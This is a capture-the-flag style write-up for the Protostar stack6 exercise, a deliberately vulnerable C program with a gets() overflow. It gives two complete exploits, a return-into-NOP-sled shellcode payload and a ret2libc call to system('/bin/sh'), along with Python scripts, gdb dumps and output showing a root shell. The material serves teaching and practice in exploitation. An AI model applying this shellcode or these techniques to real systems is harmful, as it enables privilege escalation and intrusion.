## STACK FIVE ##
Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6

### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}

```


### First Method: Exploit ret from getpath ###

After disassemble the getpath() function 
```
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   %ebp
0x08048485 <getpath+1>: mov    %esp,%ebp
0x08048487 <getpath+3>: sub    $0x68,%esp
0x0804848a <getpath+6>: mov    $0x80485d0,%eax
0x0804848f <getpath+11>:        mov    %eax,(%esp)
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    0x8049720,%eax
0x0804849c <getpath+24>:        mov    %eax,(%esp)
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484a7 <getpath+35>:        mov    %eax,(%esp)
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    0x4(%ebp),%eax      <- get the current function return address
0x080484b2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484b5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484b8 <getpath+52>:        and    $0xbf000000,%eax
0x080484bd <getpath+57>:        cmp    $0xbf000000,%eax    <- a test if we are using the stack and prevent it
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    $0x80485e4,%eax
0x080484c9 <getpath+69>:        mov    -0xc(%ebp),%edx
0x080484cc <getpath+72>:        mov    %edx,0x4(%esp)
0x080484d0 <getpath+76>:        mov    %eax,(%esp)
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        movl   $0x1,(%esp)
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    $0x80485f0,%eax
0x080484e9 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x080484ec <getpath+104>:       mov    %edx,0x4(%esp)
0x080484f0 <getpath+108>:       mov    %eax,(%esp)
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret           <- we overflow the stack, and return back to this point, 
                                                 then the next address to jump to is our prepared address
                                                 on the stack following by
                                                 opcode and shellcode
End of assembler dump.

```
Let's try with the following python script *inject_gadget.py* , the return address is put before our
address on stack
```python
import struct

buffer = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
ret = struct.pack("I", 0x080484f9)
eip = struct.pack("I", 0xbffff7b0 + 50)
nop = "\x90" * 100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print(buffer + ret + eip + nop + shellcode)

```

Run the script and redirect it to a file to test with gdb first
```
python inject_gadget.py > input_gadget.txt
```

Let's run again

```
gdb /opt/protostar/bin/stack6
r < input_gadget.txt
```
And the stack after
```
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO�QQQQRRRRSSSS���������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���

eax            0xdd     221
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff79c       0xbffff79c
ebp            0x53535353       0x53535353
esi            0x0      0
edi            0x0      0
eip            0x80484f9        0x80484f9 <getpath+117>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff79c:     0x080484f9      0xbffff7e2      0x90909090      0x90909090
0xbffff7ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ec:     0x90909090      0x90909090      0x90909090      0x90909090
0x80484f9 <getpath+117>:        ret    
0x80484fa <main>:       push   %ebp

Breakpoint 2, 0x080484f9 in getpath () at stack6/stack6.c:23
23      in stack6/stack6.c
(gdb) c
Continuing.


eax            0xdd     221
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7a0       0xbffff7a0
ebp            0x53535353       0x53535353
esi            0x0      0
edi            0x0      0
eip            0x80484f9        0x80484f9 <getpath+117>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff7a0:     0xbffff7e2      0x90909090      0x90909090      0x90909090
0xbffff7b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7f0:     0x90909090      0x90909090      0x90909090      0x90909090
0x80484f9 <getpath+117>:        ret    
0x80484fa <main>:       push   %ebp

Breakpoint 2, 0x080484f9 in getpath () at stack6/stack6.c:23
23      in stack6/stack6.c
(gdb) c
Continuing.
Executing new program: /bin/dash    <- Here we are

```

and run the python script 
```
(python inject_gadget.py ; cat | /opt/protostar/bin/stack6)
```
and the result

```
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO�QQQQRRRRSSSS���������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���

whoami
root

```
### Second Method: Exploit ret2libc ###

In order to do it, we need to look for the address of the system cal *system* so
that we can invoke this function with our parameter. The idea is illustrated in
the following figure of stacks

 ----------------------------                ----------------------------  
 |                           |               |    address of "/bin/sh"   | 
 ----------------------------                ----------------------------
 | return address of getpath |               |return address of *system* |
 ----------------------------		     ----------------------------
 |       old ebp             |     -->       |    address of *system*    |
 ----------------------------                ----------------------------
 |       *ret* variable      |               |       *ret* variable      |
 ----------------------------                ----------------------------
 |         buf  ...          |               |         buf  ...          |

Let's open gdb
```
gdb /opt/protostar/bin/stack6
```
and run
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

So now we need to put also an address pointing to "/bin/sh" on the stack in
order to invoke a shell. Let's find it in the libc library. 

```
strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh                        
```

Now we just need to test again in gdb

```
(gdb) b *main
Breakpoint 1 at 0x80484fa: file stack6/stack6.c, line 26.
(gdb) r
Starting program: /opt/protostar/bin/stack6 

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack6/stack6.c:26
26      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info proc mapping
process 11675
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so <- libc base address
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]

(gdb) x/s 0xb7e97000 + 0x11f3bf
0xb7fb63bf:      "/bin/sh"
```
and now modify our python script
```python
import struct

buffer = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
system = struct.pack("I", 0xb7ecffb0)
ret_addr = "BCDE"
sh_str_addr = struct.pack("I", 0xb7fb63bf)
print(buffer + system + ret_addr + sh_str_addr)
```
and the result
```
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO����QQQQRRRRSSSS����BCDE�c��
whoami
root
```



